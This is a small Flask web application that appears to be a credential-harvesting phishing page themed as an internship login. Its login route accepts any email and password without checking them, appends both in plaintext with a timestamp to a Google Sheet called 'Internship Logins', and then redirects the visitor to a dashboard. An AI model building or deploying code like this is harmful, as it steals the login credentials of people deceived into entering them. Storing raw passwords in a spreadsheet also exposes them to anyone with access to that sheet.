from flask import Flask, render_template, request, redirect
import os
import json
from datetime import datetime
import gspread
from oauth2client.service_account import ServiceAccountCredentials

app = Flask(__name__)

# Setup Google Sheets API using JSON from environment
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds_json = os.environ.get("GOOGLE_CREDS_JSON")

if not creds_json:
    raise Exception("GOOGLE_CREDS_JSON environment variable is missing!")

creds_dict = json.loads(creds_json)
creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
client = gspread.authorize(creds)

# Open Google Sheet (first sheet in the doc)
sheet = client.open("Internship Logins").sheet1

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log credentials to Google Sheet
    sheet.append_row([email, password, timestamp])

    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

# Entry point
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))  # Railway uses this
    app.run(host='0.0.0.0', port=port)
